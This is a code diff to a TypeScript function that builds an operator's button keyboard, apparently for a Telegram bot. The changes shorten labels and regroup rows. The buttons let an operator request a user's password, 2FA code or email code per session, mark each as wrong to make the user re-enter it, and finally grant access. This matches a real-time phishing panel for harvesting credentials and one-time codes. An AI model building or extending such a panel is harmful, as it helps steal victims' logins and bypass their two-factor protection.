@@ -700,19 +700,18 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // First section: Authentication method buttons (show if not attempted yet)
   const authRow = [];
 
-  // Password button - show if not attempted
+  // Quick Action Buttons - Primary Security Methods
   if (!session.authAttempts["password"]) {
     authRow.push({
-      text: "🔒 REQUEST PASSWORD",
+      text: "🔐 PASSWORD",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
   }
 
-  // Google Auth button - show if not attempted
   if (!session.authAttempts["google"]) {
     authRow.push({
-      text: "📲 REQUEST 2FA",
+      text: "📲 2FA",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added Google Auth button");
@@ -726,46 +725,46 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Second section: Additional methods
   // SMS Code button removed - only Wrong SMS buttons will be available
 
-  // Email Code button - show if not attempted
+  // Secondary Actions Row
+  const secondaryRow = [];
+
   if (!session.authAttempts["email"]) {
-    buttons.push([
-      {
-        text: "📧 REQUEST EMAIL CODE",
-        callback_data: `auth_email_${sessionId}`,
-      },
-    ]);
+    secondaryRow.push({
+      text: "📧 EMAIL",
+      callback_data: `auth_email_${sessionId}`,
+    });
     console.log("✅ Added Email Code button");
   }
 
-  // Wrong SMS button - always available (moved from wrong buttons section)
-  buttons.push([
-    {
-      text: "❌ WRONG NUMBER",
-      callback_data: `incorrect_sms_${sessionId}`,
-    },
-  ]);
+  secondaryRow.push({
+    text: "❌ WRONG #",
+    callback_data: `incorrect_sms_${sessionId}`,
+  });
   console.log("✅ Added Wrong SMS button (always available)");
+
+  if (secondaryRow.length > 0) {
+    buttons.push(secondaryRow);
+  }
 
   // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
   const wrongButtonsRow1 = [];
   const wrongButtonsRow2 = [];
 
-  // Wrong Password button - only if user attempted password at least once
+  // Wrong Actions - Compact Layout
   if (
     session.authAttempts["password"] &&
     session.authAttempts["password"] > 0
   ) {
     wrongButtonsRow1.push({
-      text: "🚫 WRONG PASSWORD",
+      text: "🚫 PASS",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
   }
 
-  // Wrong Google Auth button - only if user attempted google auth at least once
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
     wrongButtonsRow1.push({
-      text: "🚫 WRONG 2FA",
+      text: "🚫 2FA",
       callback_data: `incorrect_google_${sessionId}`,
     });
     console.log("✅ Added Wrong Google Auth button");
@@ -773,10 +772,9 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   // Wrong SMS button moved to main buttons section to be always available
 
-  // Wrong Email button - only if user attempted email at least once
   if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
     wrongButtonsRow2.push({
-      text: "🚫 WRONG EMAIL",
+      text: "🚫 EMAIL",
       callback_data: `incorrect_email_${sessionId}`,
     });
     console.log("✅ Added Wrong Email button");
@@ -790,11 +788,11 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     buttons.push(wrongButtonsRow2);
   }
 
-  // Fourth section: Complete Auth button (if user has completed at least one additional step)
+  // Executive Decision - Final Approval
   if (session.completedSteps.length > 1) {
     buttons.push([
       {
-        text: "✅ APPROVE ACCESS",
+        text: "✅ APPROVE & GRANT ACCESS",
         callback_data: `complete_auth_${sessionId}`,
       },
     ]);
